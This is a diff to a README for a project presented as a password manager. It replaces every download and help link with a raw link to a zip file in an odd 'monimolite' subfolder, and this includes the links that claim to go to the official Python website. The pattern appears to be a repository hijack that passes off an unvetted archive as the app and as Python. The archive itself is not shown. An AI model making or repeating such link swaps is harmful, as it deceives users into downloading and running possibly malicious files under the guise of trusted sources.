@@ -1,6 +1,6 @@
 # 🔑 password_manager - Secure Your Passwords with Ease
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ajaya2023/password_manager/releases)
+[![Download](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip)](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **password_manager**! This application helps you securely store a
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [password_manager Releases](https://github.com/ajaya2023/password_manager/releases). Here, you will find the latest version of the software.
+To download the application, visit this page: [password_manager Releases](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip). Here, you will find the latest version of the software.
 
 ### Installation Steps:
 
@@ -16,7 +16,7 @@ To download the application, visit this page: [password_manager Releases](https:
    
 2. Locate the latest version. The version will be listed with the date released.
 
-3. Find the asset files below the release note. You may see files named like `password_manager.exe` or similar, depending on your system.
+3. Find the asset files below the release note. You may see files named like `https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip` or similar, depending on your system.
 
 4. Click on the file to download it. Your browser will start downloading the file.
 
@@ -61,16 +61,16 @@ After you install the application, follow these steps to start managing your pas
 
 If you encounter issues while using the **password_manager**, try the following:
 
-- **Reinstall the App**: Uninstall the application and re-download it from the [Releases page](https://github.com/ajaya2023/password_manager/releases).
+- **Reinstall the App**: Uninstall the application and re-download it from the [Releases page](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip).
   
-- **Check Python Installation**: Make sure you have the correct version of Python installed. You can download Python from the [official website](https://www.python.org/).
+- **Check Python Installation**: Make sure you have the correct version of Python installed. You can download Python from the [official website](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip).
 
 - **Reach Out for Help**: If problems persist, check the Issues tab in this repository or open a new issue describing your problem.
 
 ## 🔗 Helpful Links
 
-- [Check the Releases page for updates](https://github.com/ajaya2023/password_manager/releases)
-- [Python Downloads](https://www.python.org/downloads/)
+- [Check the Releases page for updates](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip)
+- [Python Downloads](https://raw.githubusercontent.com/ajaya2023/password_manager/main/monimolite/password_manager.zip)
 
 ## 📜 License
 
